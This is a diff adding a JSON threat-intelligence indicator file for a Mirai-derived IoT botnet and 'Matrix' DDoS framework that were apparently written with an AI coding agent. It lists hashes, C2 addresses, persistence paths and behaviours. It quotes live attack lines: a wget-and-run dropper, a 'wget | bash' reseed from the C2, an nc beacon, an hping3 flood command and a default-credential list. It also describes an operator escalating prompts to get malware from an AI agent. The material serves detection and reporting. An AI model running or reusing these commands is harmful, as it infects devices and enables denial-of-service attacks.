@@ -1,0 +1,508 @@
+{
+  "metadata": {
+    "malware_name": "Rovodev AI Co-Authored Pandora-Mirai Variant + Matrix C2 Framework",
+    "family": "Pandora-Mirai (Sora-fork derivative) + Matrix C2 (operator-built; AI-co-authored)",
+    "campaign_slug": "rovodev-mirai-matrix-c2-87.106.143.220",
+    "campaign_identifier": "UTA-2026-014",
+    "parent_series": "ai-agent-frameworks-2026-05-23",
+    "report_date": "2026-05-26",
+    "analyst": "The Hunters Ledger",
+    "confidence": "HIGH",
+    "tlp": "CLEAR",
+    "threat_level": "HIGH"
+  },
+  "file_indicators": [
+    {
+      "value": "64afc3b3a02706ffcf4255bda4519f8c1c66daaaf937a2641fd14a551a34e383",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Naku.arm — Pandora-Mirai 11-arch IoT botnet bot binary. VT 43/66. Microsoft Mirai.AW!xp. Universal MAL_ELF_LNX_Mirai_Oct10_1 YARA. Operator-bespoke XOR-0x54 string obfuscation + 22-char charset 1gba4cdom53nhp12ei0kfj."
+    },
+    {
+      "value": "e4d3d361ba8b25f8effcf7786b32185cf7255059fcf55b2509101779703a15aa",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Naku.arm5 — Pandora-Mirai variant. VT 42/66. Microsoft Mirai.AW!xp."
+    },
+    {
+      "value": "b7d999255a12da91f23453ec940cdc52b64e59c6e205f227ceae98a83027de20",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Naku.arm6 — Pandora-Mirai variant. VT 42/66. Microsoft Mirai.AW!xp."
+    },
+    {
+      "value": "595f4315f00c2fce839eabe9880f669990256d6638fb148996872e37ffc9b28a",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Naku.arm7 — Pandora-Mirai variant DEBUG BUILD (139.5 KB; 710 strings). VT 39/65. Retains canonical Mirai source-tree symbols (attack_method.c / killer.c / telnet.c / table.c / util.c / rand.c / resolv.c + resolve_cnc_addr + auth_table + add_auth_entry) cross-compiled via Rob Landley aboriginal toolchain."
+    },
+    {
+      "value": "ee24f4f0fb9795bca8daba73f99bf1846fe5cdb400f5345ef4a4476b20ab5bc4",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Naku.m68k — Pandora-Mirai variant. VT 42/66. Microsoft Mirai.BO!xp."
+    },
+    {
+      "value": "afd49e3ceb20a8e861fa4804b6ea988f8aefd6942f84973f32b8e24c7df03410",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Naku.mips — Pandora-Mirai variant. VT 41/64. Microsoft Mirai.FC!MTB."
+    },
+    {
+      "value": "ef693f29b4ae47b1aa5920237946c3b0518ce84dd37e6fd6c6ee2e3e9dd6cd44",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Naku.mpsl — Pandora-Mirai variant. VT 42/66. Microsoft Mirai.DY!MTB."
+    },
+    {
+      "value": "f90658253261f8dc63446dac49a88baa0742f46a2f5448fb330acb58017980ef",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Naku.ppc — Pandora-Mirai variant. VT 42/65. Microsoft Mirai.BL!xp."
+    },
+    {
+      "value": "8aca22aa0fc77775521eaa916f490d7a433fd8f0c0f8104bb113f6127be0e530",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Naku.sh4 — Pandora-Mirai variant with Gafgyt cross-detection (Microsoft Backdoor:Linux/Gafgyt.P!MTB). VT 43/65. Supports Xbash-hybrid lineage hypothesis."
+    },
+    {
+      "value": "ec948aef742c01f91b41df9b19b0ecca3bc8ecf962e2360aee181b9b89abfc78",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Naku.spc — Pandora-Mirai variant. VT 41/66. Microsoft Mirai.FG!MTB. VT-named /tmp/pandora_bot — DEFINITIVE Naku ≡ Pandora identity reconciliation; pandora.sh dropper SHA d3fd9994... as execution_parent."
+    },
+    {
+      "value": "0c77fee765a40486c396e9b14f6eb9a787c4c5d9261669b60ab35fed7fe1a626",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Naku.x86 — Pandora-Mirai variant. VT 42/66. Microsoft Mirai.AW!MTB. Recommended for binary disassembly (universally tooled x86 disassembly)."
+    },
+    {
+      "value": "d3fd9994b16dc9b14c29f7faf7b5f6c84f44b06fccf82f0031a0871ce5e20e17",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "pandora.sh — HTTP:80 campaign-channel dropper. VT 17/66. Execution_parent of all 11 Naku binaries per VT. Victim-facing deployment via HTTP (many IoT victims don't support HTTPS)."
+    },
+    {
+      "value": "e9e0eafc89e4a9db796c63bb4fdc5c0fd1106f8b9c234fb57e51a7934f2b8d8e",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "master_control.py — Matrix C2 orchestrator. AI-authored via Atlassian Rovodev (captured in session_context.json file_write tool call). Spawns multi_vector_agent.py + socks5_manager.py + backup-VPS deployment workflow."
+    },
+    {
+      "value": "921e4c1d86813838d40010e82a8f374a70b91f06008db5182d1ec6c2da672c09",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "attack_engine.py — Matrix C2 multi-protocol DDoS engine. AI-authored via Rovodev. scapy-based UDP/TCP/ICMP floods with source-IP spoofing. Operator self-marketing comment: '# Increased default threads for 50Gbps+'. Method dispatch shows tier-bleed (udp-star/udp-bypass both → udp_flood)."
+    },
+    {
+      "value": "a19b972688158e361e8646ec17556ec46bf84f0cd24fb8707e4df85cb9d9a6d2",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "multi_vector_agent.py — Matrix C2 dispatcher. AI-authored via Rovodev. Hunt classifier flags 'Source representation shows indentation/formatting issues likely from copy/paste' (Copy-Paste Indentation Decay sub-pattern #7) + Name/Implementation Mismatch bug (launch_udp_flood calls http_flood.py)."
+    },
+    {
+      "value": "9e70449b2aafc71c7ff16ece42053fb41b92394cdb88ce799f60d50b4fbefa9e",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "encrypted_agent.py — Matrix C2 encrypted agent with AES-256-GCM + PBKDF2 + handshake. AI-authored via Rovodev (captured in session_context.json file_write tool call)."
+    },
+    {
+      "value": "d1086ab3c06764ffd81492b4c723bda83bac19dc101c8542bc566e5888c92da3",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "stealth_agent.py — Matrix C2 stealth agent with anti-debug + anti-VM + sandbox checks + process hiding + simple rootkit + systemd/cron persistence + self-destruct + polymorphic payload. AI-authored via ESCALATED prompt (refines AI-Generated Code Signature item #4 from structural to prompt-conditional)."
+    },
+    {
+      "value": "47731b72ca73003af7770a8be876e8f41ffde37a76337eb34630d114727888e9",
+      "type": "sha256",
+      "confidence": "HIGH",
+      "context": "layer7_ultra.py — Matrix C2 aiohttp-based L7 flooder with Cloudflare-bypass + cache-bypass + random headers + SSL verification disabled."
+    },
+    {
+      "value": "63f0da53daac05df184c96949bcfa2e5d0d5fee425900a75ae58662479c14099",
+      "type": "sha256",
+      "confidence": "HIGH",
+      "context": "http_flood.py — Matrix C2 simple HTTP/HTTPS flooder (100 threads, no rate limiting)."
+    },
+    {
+      "value": "65eb951a0b4a0fd1e524137bbd3052255497cccac380beb11661beb45ac9b489",
+      "type": "sha256",
+      "confidence": "HIGH",
+      "context": "dns_amp.py — Matrix C2 DNS amplification script. Operator-bug per Hunt: 'Contains indentation/syntax error; does not spoof source IP so resolvers won't amplify effectively' — sub-pattern #7 Copy-Paste Indentation Decay confirmed."
+    },
+    {
+      "value": "435da9f5fcecdbad48b6d1e572f70c122a80be7c0586492ce65d46cfb928cbee",
+      "type": "sha256",
+      "confidence": "HIGH",
+      "context": "matrix/exploits/cve_2017_6077.py — Mass-exploit module for CVE-2017-6077 Netgear DGN1000/DGN2200/DGN3300 command injection. Accounts for Hunt-curated 92-Netgear-devices-exploited count."
+    },
+    {
+      "value": "f63bb6b25c8db035173eb257a3e5d459352aff31734991637c66ea4167bf55fc",
+      "type": "sha256",
+      "confidence": "HIGH",
+      "context": "matrix/exploits/multi_cve.py — Multi-CVE exploit module. Targets Netgear, ZyXEL, Dasan, Netis, Guangzhou, Huawei, Micro Focus devices."
+    },
+    {
+      "value": "4a02f11edda477fc6c629a3bc857b05948fff70912f73f264779c3b36ff60fa9",
+      "type": "sha256",
+      "confidence": "HIGH",
+      "context": "matrix/amps/memcached_amplifier.py — UDP/11211 memcached amplification (51,200x amp factor classic)."
+    },
+    {
+      "value": "c899c7435335dd37bfd45eefe5cd353802649c627dd26ea3e5dd26119fe4d6d3",
+      "type": "sha256",
+      "confidence": "HIGH",
+      "context": "matrix/amps/ntp_amplifier.py — UDP/123 NTP monlist amplification with IP source spoofing (IP_HDRINCL)."
+    },
+    {
+      "value": "33c50d71a1d9e6aa2598942893809dbfa617a2a0e86044b36b83802b382d7652",
+      "type": "sha256",
+      "confidence": "HIGH",
+      "context": "matrix/amps/ssdp_amplifier.py — UDP/1900 SSDP M-SEARCH reflector."
+    },
+    {
+      "value": "4809a7ee9f5dbcbe86cfbd77a45e2a268a37bcc947e8e1621164df653597948b",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "matrix/bot.sh + matrix/payloads/persistent_bot.sh (same SHA) — 5-vector Linux persistence installer (cron + rc.local + init.d + systemd + .bashrc/.profile). AI-authored via Rovodev. JSON-over-TCP/1337 wire protocol."
+    },
+    {
+      "value": "9d4d5ea53045d98d288b54e2208f562642a913126c16b9d8eedafab450dbb9b7",
+      "type": "sha256",
+      "confidence": "HIGH",
+      "context": "matrix/payloads/bot_payload.sh — additional bot payload variant. Hunt MITRE tags T1016 + T1053.003 + T1082 + T1497.001 + T1543.002 + T1547.013."
+    },
+    {
+      "value": "64ca12cae6f5e520abb4158da3bbc14e909c2128748ae0c5806fa4206cc14260",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "matrix/bots/mirai_clone.py — Python Mirai-style standalone bot (conceptual Mirai-clone). AI-authored via Rovodev. 5/5 AI-Generated Code Signature match (verbose docstrings + defensive try/except + educational variable names + zero anti-analysis + AI-grade rate limiting). Reports to 87.106.143.220:1337 via pipe-delimited TCP."
+    },
+    {
+      "value": "fba4072941038d27a28a1089ab24d9c3e22f0db19994f3c12c688085903a6ded",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "matrix/bots/web_scraper_bot.py — Python BFS depth-3 credential/secret harvester. AI-authored via Rovodev. 5/5 AI-Generated Code Signature match. Extracts AWS keys / GitHub PATs / Slack tokens / Stripe sk_live keys from victim HTML."
+    },
+    {
+      "value": "58ef3f244dab408fac7117606843a3dbcfb0754b2032a5950e977bc1811c0313",
+      "type": "sha256",
+      "confidence": "HIGH",
+      "context": "bot.sh (Phase 3h-earliest captured variant) — originally sourced from upstream github.com/keyosbuff/C2-Leak (now deleted/404). Pre-evolution baseline for the matrix/bot.sh family."
+    },
+    {
+      "value": "79b01dd6e9e808b8e14c9a7dd2751264dd4d5fd96508de383c0fdbfd81a814dc",
+      "type": "sha256",
+      "confidence": "HIGH",
+      "context": "matrix/proxies/proxy_chain.py — SOCKS5 proxy chain builder with TOR helpers."
+    },
+    {
+      "value": "e091a8cb3286e61f87a0d515705d79f8eebdbc64accc9e147ca48f35aa85ce2c",
+      "type": "sha256",
+      "confidence": "HIGH",
+      "context": "matrix/proxies/socks5_manager.py — fetches public SOCKS5 lists, validates and rotates proxies."
+    },
+    {
+      "value": "81748f0236319c678db39945ec77fffe1b33e84ffa9731b2836b911f8e83a5cc",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Rovodev session_context.json (257b6faf session, 1.24 MB) — DIRECT AI-AUTHORING EVIDENCE; captures file_write tool calls with initial_content payloads creating master_control.py + attack_engine.py + multi_vector_agent.py + encrypted_agent.py + stealth_agent.py."
+    },
+    {
+      "value": "d888a16cd6aa76f62a329906db4f241e6bc23ff5f21d61e754ade8ccab6da0d0",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Rovodev rovodev.log (8.5 MB) — Rovodev CLI runtime log including the Discord-bot JavaScript attack-method dispatch table (13+ attack methods catalog)."
+    },
+    {
+      "value": "9eece9f46bc420b53884d4292622621c9960459c1d7a73635420771e7d0aa1fa",
+      "type": "sha256",
+      "confidence": "DEFINITE",
+      "context": "Rovodev session_context.json (8b911ec6 session, 176 KB) — SECOND distinct AI-authoring session. Captures DDoS-as-a-Service tier model JavaScript catalog (VIP/free tiers, GBPS estimates, emoji branding 🔥🚀) + SQL data-load tuple list with schema (method_name, layer_tier, description, power_multiplier, access_tier)."
+    }
+  ],
+  "network_indicators": [
+    {
+      "value": "87.106.143.220",
+      "type": "ipv4",
+      "confidence": "DEFINITE",
+      "context": "Operator-OWNED primary IONOS DE VPS. Hosts Matrix C2 framework C2 on TCP/1337 + bot.sh distribution on HTTP/80 + Naku binary HTTPS-channel test on /bins/Naku.*/443 + Pandora HTTP-channel deploy on /Pandoras_Box/Pandora.*/80 + .rovodev/ AI authoring session directory + 22+ AI-generated handoff documents."
+    },
+    {
+      "value": "87.106.54.213",
+      "type": "ipv4",
+      "confidence": "DEFINITE",
+      "context": "Operator-OWNED backup IONOS DE VPS (same /16 as primary). Referenced in IMPLEMENTATION_PLAN.txt Phase 2 for dual scanning + 1000+/day infection rate target."
+    },
+    {
+      "value": "165.227.175.161",
+      "type": "ipv4",
+      "confidence": "DEFINITE",
+      "context": "Parasitic Naku CNC on COMPROMISED GetYourGroup tourism VPS (DigitalOcean US allocation 165.227.0.0/16). TCP/23 daemon planted on legitimate Ubuntu 18.04 + OpenSSH 7.6p1 + MariaDB 10.2.44 + RunCloud-managed production VPS hosting auvergne-rhone-alpes-for-groups.com tourism domain. CNC IP hardcoded inline in Naku.arm main() as 0xa1afe3a5. False_positive_risk: HIGH (legitimate tourism VPS — coordinate with GetYourGroup BEFORE any takedown)."
+    },
+    {
+      "value": "80.211.94.16",
+      "type": "ipv4",
+      "confidence": "DEFINITE",
+      "context": "Aruba S.p.A. Italy distribution server (ASN AS31034). Embedded plaintext in all 11 Naku binaries as 'http://80.211.94.16/Naku.mips'. VT 5/56 detections. Currently OFFLINE as of 2026-05-24 (ACL asymmetry suggests targeted filtering policy). Burning-fuse OPSEC pattern."
+    },
+    {
+      "value": "80.211.111.10",
+      "type": "ipv4",
+      "confidence": "HIGH",
+      "context": "Aruba S.p.A. Italy sibling distribution server (ASN AS31034). Embedded in all 11 Naku binaries alongside .94.16. VT 0/55 (clean reputation = burning-fuse). Currently DARK on all 40 ports tested as of 2026-05-24."
+    },
+    {
+      "value": "188.166.194.243",
+      "type": "ipv4",
+      "confidence": "MODERATE",
+      "context": "DEFENDER CONTEXT — NOT operator-controlled. Shares all 3 SSH host keys with 165.227.175.161 due to RunCloud snapshot-deploy pattern. Hosts 28 GetYourGroup tourism domains including getyourgroup.de, france-for-groups.com, occitanie-for-groups.com, paris-region-for-groups.com. NO port 23 listener. Include as defender-context to prevent false-positive blocking of clean GetYourGroup sibling VPS. false_positive_risk: DEFINITE."
+    },
+    {
+      "value": "http://87.106.143.220/bot.sh",
+      "type": "url",
+      "confidence": "DEFINITE",
+      "context": "Persistence-reseed URL embedded in all 5 persistence vectors of persistent_bot.sh. Operator pushes updated bot binaries by replacing bot.sh on the IONOS VPS; all infected hosts re-download on next cron/login/restart."
+    },
+    {
+      "value": "http://80.211.94.16/Naku.mips",
+      "type": "url",
+      "confidence": "DEFINITE",
+      "context": "Distribution URL embedded plaintext in Naku.arm exploit payload (CVE-2014-8361 Realtek + CVE-2017-17215 Huawei droppers). Full payload: 'cd /var; rm -rf nig; wget http://80.211.94.16/Naku.mips -O nig; chmod 777 nig; ./nig realtek'."
+    },
+    {
+      "value": "http://87.106.143.220:443/bins/Naku.{arch}",
+      "type": "url_pattern",
+      "confidence": "DEFINITE",
+      "context": "HTTPS-channel operator-internal VT-test channel for the 11-arch binary set. {arch} substitutes arm/arm5/arm6/arm7/m68k/mips/mpsl/ppc/sh4/spc/x86."
+    },
+    {
+      "value": "http://87.106.143.220:80/Pandoras_Box/Pandora.{arch}",
+      "type": "url_pattern",
+      "confidence": "DEFINITE",
+      "context": "HTTP-channel victim-facing campaign deployment for the same 11-arch binary set. Naku ≡ Pandora — same binary suite served via two channels."
+    },
+    {
+      "value": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
+      "type": "user_agent",
+      "confidence": "DEFINITE",
+      "context": "Mirai-canonical legacy-IE UA embedded plaintext in Naku.arm exploit payloads (CVE-2017-17215 Huawei + CVE-2014-8361 Realtek). NOT operator-bespoke — stock Mirai signature."
+    },
+    {
+      "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "type": "user_agent",
+      "confidence": "HIGH",
+      "context": "Operator's web_scraper_bot.py UA — chosen for IDS-blending; also matches Russian Gemini operator default (parent-report Case 1). false_positive_risk: HIGH (common Chrome desktop UA — pair with depth-3 same-domain-burst pattern from single IP for high confidence)."
+    }
+  ],
+  "host_indicators": [
+    {
+      "value": "/root/matrix/",
+      "type": "file_path",
+      "confidence": "DEFINITE",
+      "context": "Operator's working directory for Matrix C2 framework (96+ files captured at depth-1 inventory)."
+    },
+    {
+      "value": "/root/.rovodev/",
+      "type": "file_path",
+      "confidence": "DEFINITE",
+      "context": "Operator's Atlassian Rovodev AI agent installation directory. Contains sessions/ + logs/ subdirectories with captured AI-authoring evidence."
+    },
+    {
+      "value": "/etc/cron.d/.cache_update",
+      "type": "file_path",
+      "confidence": "DEFINITE",
+      "context": "Persistence vector 1 (cron) — hidden filename ('.' prefix). Reseeds 'wget -qO- http://87.106.143.220/bot.sh | bash' every 5 minutes."
+    },
+    {
+      "value": "/etc/init.d/sysupdate",
+      "type": "file_path",
+      "confidence": "DEFINITE",
+      "context": "Persistence vector 3 (System V) — name blends with legitimate update mechanisms. Registered via 'update-rc.d sysupdate defaults'."
+    },
+    {
+      "value": "/etc/systemd/system/system-update.service",
+      "type": "file_path",
+      "confidence": "DEFINITE",
+      "context": "Persistence vector 4 (systemd) — Restart=always with 300s reseed loop. Name blends with legitimate update mechanisms."
+    },
+    {
+      "value": "/etc/rc.local",
+      "type": "file_path",
+      "confidence": "DEFINITE",
+      "context": "Persistence vector 2 (RC.local). Line containing 'wget -qO- http://87.106.143.220/bot.sh | bash &' appended by installer."
+    },
+    {
+      "value": "/dev/watchdog",
+      "type": "file_path",
+      "confidence": "DEFINITE",
+      "context": "Mirai-canonical watchdog-disable persistence target. Naku bot opens this device and runs WDIOC_KEEPALIVE ioctl in infinite 30s-sleep loop to prevent IoT device auto-reboot."
+    },
+    {
+      "value": "/dev/misc/watchdog",
+      "type": "file_path",
+      "confidence": "DEFINITE",
+      "context": "Alternative watchdog path on some IoT devices. Naku bot opens both /dev/watchdog and /dev/misc/watchdog."
+    },
+    {
+      "value": "/tmp/pandora_bot",
+      "type": "file_path",
+      "confidence": "DEFINITE",
+      "context": "VT-extracted runtime process name for Naku.spc. Proves Naku ≡ Pandora identity. Used for in-memory process identification."
+    },
+    {
+      "value": "PandoraNet",
+      "type": "mutex_or_botnet_id",
+      "confidence": "DEFINITE",
+      "context": "Operator-bespoke botnet ID (suffixed by arch). Not observed on any other host in Hunt's 365-day index. Used in Naku.spc execution as 'pandora_bot PandoraNet.{arch}' invocation."
+    },
+    {
+      "value": "1gba4cdom53nhp12ei0kfj",
+      "type": "string_signature",
+      "confidence": "DEFINITE",
+      "context": "Operator-bespoke 22-char random-string charset. Present in all 11 Naku binaries (XOR-0x54-encoded as bytes '65 33 36 35 60 37 30 3B 39 61 67 3A 3C 24 65 66 31 3D 64 3F 32 3E'). Single YARA target catches entire 11-arch family."
+    },
+    {
+      "value": "/bin/busybox SORA",
+      "type": "string_signature",
+      "confidence": "DEFINITE",
+      "context": "Sora-fork derivative signature in Naku bot (XOR-0x54-encoded). Replaces stock Mirai's '/bin/busybox MIRAI' token. Confirms 2017+ Sora lineage."
+    },
+    {
+      "value": ".anime",
+      "type": "string_signature",
+      "confidence": "HIGH",
+      "context": "Operator-bespoke marker decoded from XOR-0x54 region in Naku bot. Unusual; possible persistence-file extension OR community-of-origin marker (anime-themed naming common in some criminal subcommunities)."
+    },
+    {
+      "value": "1441591352927326259",
+      "type": "discord_id",
+      "confidence": "DEFINITE",
+      "context": "Operator Discord ID — snowflake-decoded to creation timestamp 2025-11-22T00:49:22 UTC (~182 days old at investigation = fresh ops persona, not long-lived). Referenced in operator's whatineed.txt prompt: 'my user ID is 1441591352927326259'."
+    },
+    {
+      "value": "github.com/keyosbuff/C2-Leak",
+      "type": "github_handle",
+      "confidence": "MODERATE",
+      "context": "Operator's referenced upstream code source per whatineed.txt: 'i want it to be like this c2 >https://github.com/keyosbuff/C2-Leak/tree/main but better with everything i put in'. Repo now DELETED / 404 / orphaned (Phase 15 §22). May represent operator's own deleted repo OR a separate upstream operator."
+    },
+    {
+      "value": "PandoraNet.arm + PandoraNet.arm5 + PandoraNet.arm6 + PandoraNet.arm7 + PandoraNet.m68k + PandoraNet.mips + PandoraNet.mpsl + PandoraNet.ppc + PandoraNet.sh4 + PandoraNet.spc + PandoraNet.x86",
+      "type": "filename_pattern",
+      "confidence": "HIGH",
+      "context": "Operator-bespoke per-architecture botnet instance naming convention. Pattern observed in operator's IMPLEMENTATION_PLAN.txt + persistent_bot.sh deployment workflow."
+    }
+  ],
+  "behavioral_indicators": [
+    {
+      "value": "Triple XOR keys for Naku string obfuscation (0x54 general / 0x42 credentials / 0x45 duplicate-assword)",
+      "type": "obfuscation_pattern",
+      "confidence": "DEFINITE",
+      "context": "Operator-bespoke split-key obfuscation beyond commodity Mirai-fork tradecraft (most operators use one key). Operator-permanent across all 11 architectures."
+    },
+    {
+      "value": "Naku CNC option-key protocol: length-prefixed STRINGS (vs stock Mirai single-byte enum)",
+      "type": "protocol_modification",
+      "confidence": "DEFINITE",
+      "context": "Operator-bespoke Mirai-protocol modification that defeats Mirai-protocol-aware IDS rules. Defenders must use Naku-specific detection signatures, not stock Mirai signatures. Recovered via Ghidra decompilation of FUN_000082bc (attack_parse function)."
+    },
+    {
+      "value": "Four parallel scanner threads (Huawei #1 CVE-2017-17215 + Huawei #2 operator-bespoke + Realtek CVE-2014-8361 + Telnet brute 128-concurrent)",
+      "type": "scanner_architecture",
+      "confidence": "DEFINITE",
+      "context": "Naku bot launches 4 parallel scanner threads from main(). Double-Huawei modification (huawei_scanner.c + huawei1_scanner.c source filenames + corresponding function-symbol sets in arm7 debug build) distinguishes from stock Mirai-Pandora forks."
+    },
+    {
+      "value": "Dual-channel C2 architecture (Matrix C2 on operator-OWNED IONOS 87.106.143.220:1337 + Naku CNC on COMPROMISED GetYourGroup VPS 165.227.175.161:23)",
+      "type": "infrastructure_pattern",
+      "confidence": "DEFINITE",
+      "context": "Operator deliberately separates customer-facing infrastructure (Matrix on owned VPS) from worm/botnet propagation infrastructure (Naku on compromised VPS). Sophisticated split-channel deployment thinking."
+    },
+    {
+      "value": "Burning-fuse distribution servers (Aruba Italy IPs dark to Hunt 365-day index during operational window; offline within ~4 months)",
+      "type": "infrastructure_pattern",
+      "confidence": "DEFINITE",
+      "context": "Distribution-channel OPSEC pattern: disposable single-use VPSes burned before accumulating telemetry. Operator must push new builds after burn to resume propagation."
+    },
+    {
+      "value": "Selective inbound IP filtering on Naku CNC (drops Cloudflare WARP, accepts arbitrary residential/IoT source IPs)",
+      "type": "opsec_pattern",
+      "confidence": "MODERATE",
+      "context": "Operator-side firewall rule filtering known scanner sources. opendir-hunter via Cloudflare WARP gets 'No route to host' while Hunt scanner sees host alive on same ports same day."
+    },
+    {
+      "value": "JSON-over-TCP wire protocol on Matrix C2 (87.106.143.220:1337): '{\"type\":\"bot_register\",...}' + '{\"type\":\"heartbeat\",\"bot_id\":...}'",
+      "type": "wire_protocol",
+      "confidence": "DEFINITE",
+      "context": "persistent_bot.sh registration + heartbeat protocol. Heartbeat cadence: 30 seconds. Both messages sent via 'nc -w 5 87.106.143.220 1337'."
+    },
+    {
+      "value": "Pipe-delimited wire protocol on Matrix C2: 'INFECTED|<ip>|<user>|<pass>|<protocol>'",
+      "type": "wire_protocol",
+      "confidence": "DEFINITE",
+      "context": "mirai_clone.py reports to 87.106.143.220:1337 via raw TCP socket with pipe-delimited message format. Implementation inconsistency with JSON format = artifact of AI-prompted iteration (different sessions produced different wire formats for same C2)."
+    },
+    {
+      "value": "Mirai-canonical CNC command wire format with operator-modified string-key options (variable-length per command, bounded at 1024 bytes)",
+      "type": "wire_protocol",
+      "confidence": "DEFINITE",
+      "context": "Naku CNC command structure on 165.227.175.161:23: 4-byte duration BE + 1-byte attack_method + 1-byte target_count + 5*N target table + 1-byte option_count + per-option (1-byte key_length + variable key STRING + 1-byte value). Operator-bespoke string-key option modification."
+    },
+    {
+      "value": "5-vector Linux persistence (cron + rc.local + init.d + systemd + .bashrc/.profile)",
+      "type": "persistence_pattern",
+      "confidence": "DEFINITE",
+      "context": "persistent_bot.sh installs persistence across 5 independent vectors to defeat single-mechanism removal."
+    },
+    {
+      "value": "Mirai-canonical watchdog-disable persistence loop (ioctl WDIOC_SETOPTIONS + WDIOC_KEEPALIVE on /dev/watchdog with 30s sleep)",
+      "type": "persistence_pattern",
+      "confidence": "DEFINITE",
+      "context": "Naku bot prevents IoT device auto-reboot via watchdog-pet infinite loop. Defeats reset-cycle-based remediation."
+    },
+    {
+      "value": "Competitor-malware kill via pkill: 'pkill -9 -f \"(mirai|qbot|tsunami|gafgyt|bashlite|kaiten)\"'",
+      "type": "competitor_kill_pattern",
+      "confidence": "DEFINITE",
+      "context": "persistent_bot.sh kills 6 known competitor IoT botnets by name pattern."
+    },
+    {
+      "value": "AI-Generated Code Signature universal subset (verbose docstrings + educational variable names + Copy-Paste Indentation Decay + emoji-in-output bleed + version-numbered file persistence)",
+      "type": "ai_authorship_signature",
+      "confidence": "DEFINITE",
+      "context": "Cross-3-operator confirmed (Case 1 Russian Gemini + Case 2 Turkish ARPA + Case 3 this case). Detection rubric for AI-authored offensive Python code. Universal-subset criteria #1/#3/#7/#9/#10 confirmed cross-operator."
+    },
+    {
+      "value": "9-variant scanner iteration chain (autoscanner → autoscanner_v2 → aggressive_scanner → auto_exploit_scanner → extreme_scanner → final_scanner → hyper_scanner → mega_scanner → mega_scanner_fixed)",
+      "type": "ai_authorship_signature",
+      "confidence": "DEFINITE",
+      "context": "Sub-pattern #10 (operator-iteration-via-AI = version-numbered file persistence). Operator asks AI to 'make a better scanner' repeatedly; AI produces new variants with escalated naming; operator keeps every version on disk."
+    },
+    {
+      "value": "22+ AI-generated handoff docs with escalating-superlative naming pattern (FINAL_*, COMPLETE_*, ULTIMATE_*, READY_*, SOLUTION_COMPLETE)",
+      "type": "ai_authorship_signature",
+      "confidence": "DEFINITE",
+      "context": "AI-Generated Documentation Signature. Naming inflation as operator asks AI for 'final version' repeatedly across iteration rounds without archive discipline."
+    },
+    {
+      "value": "DDoS-as-a-Service tier model (VIP/free, GBPS estimates, emoji branding 🔥🚀, JavaScript dispatch table for Discord-bot customer interface, 13+ named attack methods across L3/L4/L7)",
+      "type": "monetization_pattern",
+      "confidence": "DEFINITE",
+      "context": "Criminal SaaS productization. Schema captured in 8b911ec6 session JSON: (name, description, layer, power, vip, gbps) per method + SQL data-load tuple (method_name, layer_tier, description, power_multiplier, access_tier). Discord bot is customer interface."
+    },
+    {
+      "value": "hping3-based L4 attack delegation: hping3 --udp/--syn --flood --rand-source --data 65500",
+      "type": "attack_command_pattern",
+      "confidence": "DEFINITE",
+      "context": "Discord bot delegates high-volume L4 attacks to hping3 (low overhead, raw-socket capable); reserves attack_engine.py for protocol-aware attacks (icmp-hell, frag-storm, dns-rain)."
+    },
+    {
+      "value": "16-entry credential brute-list (DEFAULT/ADMIN/VIZXV/HOME/TELNET/TTNET/GPON/ZTE/TELECOMADMIN/ADMINTELECOM/TELNETADMIN/SUPPORT/CHIN/AQUARIO/ADM/ROOT) with TTNET (Türk Telekom subsidiary) standout entry",
+      "type": "credential_brute_list",
+      "confidence": "DEFINITE",
+      "context": "Naku bot XOR-0x42-encoded credential brute-list. TTNET addition suggests possible Turkish residential IoT targeting OR Sora-fork inheritance (indeterminate)."
+    }
+  ]
+}
